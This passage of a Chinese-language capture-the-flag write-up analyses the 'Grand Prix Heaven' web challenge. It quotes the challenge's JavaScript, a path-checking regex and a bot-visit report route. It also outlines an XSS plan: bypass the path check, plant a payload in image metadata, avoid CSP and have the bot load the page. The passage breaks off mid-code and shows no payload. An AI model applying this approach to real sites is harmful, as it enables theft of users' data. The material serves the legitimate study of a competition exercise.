style=\"color:#a6e22e\"\u003emakeRequest\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ethen\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e) =\u0026gt; \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e()).\u003cspan style=\"color:#a6e22e\"\u003ethen\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003ejsonBody\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etitleElem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003egetElementById\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title-card\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edateElem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003egetElementById\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;date-card\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edescElem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003egetElementById\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;desc-card\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eimgElem\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e document.\u003cspan style=\"color:#a6e22e\"\u003egetElementById\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;img-card\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003etitleElem\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etextContent\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ejsonBody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emodel\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ejsonBody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003emake\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003edateElem\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etextContent\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejsonBody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecreatedAt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ejsonBody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eimg_id\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \t    \u003cspan style=\"color:#a6e22e\"\u003eimgElem\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esrc\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`/media/\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ejsonBody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eimg_id\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;an error occurred with the Requester class.\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  });\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e只是改成用 json 處理並且用 \u003ccode\u003etextContent\u003c/code\u003e 設定欄位而已，所以要改成用 \u003ccode\u003emediaparser\u003c/code\u003e 才會有 \u003ccode\u003eXSS\u003c/code\u003e 的問題。\u003c/p\u003e\n\u003cp\u003e至於如何發 request ，來看一下 \u003ccode\u003eretrieve.js\u003c/code\u003e。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eRequester\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003econstructor\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclean\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no path\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ere\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e RegExp(\u003cspan style=\"color:#e6db74\"\u003e/^[A-z0-9\\s_-]+$/i\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ere\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#75715e\"\u003e// normalize\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e              \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecleaned\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ereplaceAll\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e/\\s/g\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecleaned\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;regex fail\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          } \u003cspan style=\"color:#66d9ef\"\u003ecatch\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003econsole\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dfv\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          };\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclean\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ethis\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eURL\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003emakeRequest\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efetch\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003ethis\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003ethen\u003c/span\u003e((\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Error occurred when attempting to retrieve media data\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到這邊有路徑檢查\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no path\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ere\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e RegExp(\u003cspan style=\"color:#e6db74\"\u003e/^[A-z0-9\\s_-]+$/i\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ere\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003etest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#75715e\"\u003e// normalize\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e              \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecleaned\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epath\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ereplaceAll\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e/\\s/g\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecleaned\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              \u003cspan style=\"color:#66d9ef\"\u003ethrow\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Error(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;regex fail\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e由於預設是 apiparser 所以拿到的資料應該會是 json，當成功改成 \u003ccode\u003emediaparser\u003c/code\u003e 我們必須要繞過這個路徑檢查來達成存取圖片的目的。\u003c/p\u003e\n\u003cp\u003e最後 web server 有一個 route\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eapp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003epost\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/report\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003easync\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003etypeof\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;string\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estartsWith\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://grandprixheaven-web.2024.ctfcompetition.com/\u0026#39;\u003c/span\u003e)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003esend\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid url\u0026#34;\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ebot\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003evisit\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eurl\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003esend\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Done!\u0026#34;\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e});\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e因此我們可以知道這題是一個 XSS challenge\u003c/p\u003e\n\u003ch3 id=\"解題-1\"\u003e解題\u003c/h3\u003e\n\u003cp\u003e目標是要新增一台車，並且顯示頁面時要使用 \u003ccode\u003emediaparser\u003c/code\u003e 同時 \u003ccode\u003eF1\u003c/code\u003e param 必須要是上傳的圖片的路徑，且該圖片的資訊要有 XSS payload，且網頁不能有 CSP 否則 XSS 傳出資料時會被 CSP 擋住，最後送這網址給 bot 瀏覽。\u003c/p\u003e\n\u003cp\u003e首先我們來看看顯示車的 frontend route\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eapp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/fave/:GrandPrixHeaven\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003easync\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e) =\u0026gt; {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egrandPrix\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eConfiguration\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003efindOne\u003c/span\u003e({\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ewhere\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e { \u003cspan style=\"color:#a6e22e\"\u003epublic_id\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eparams\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGrandPrixHeaven\u003c/span\u003e },\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egrandPrix\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eres\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003estatus\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e400\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e({ \u003cspan style=\"color:#a6e22e\"\u003eerror\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ERROR: ID not found\u0026#34;\u003c/span\u003e });\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elet\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edefaultData\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;csp\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;retrieve\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;apiparser\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;head_end\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan 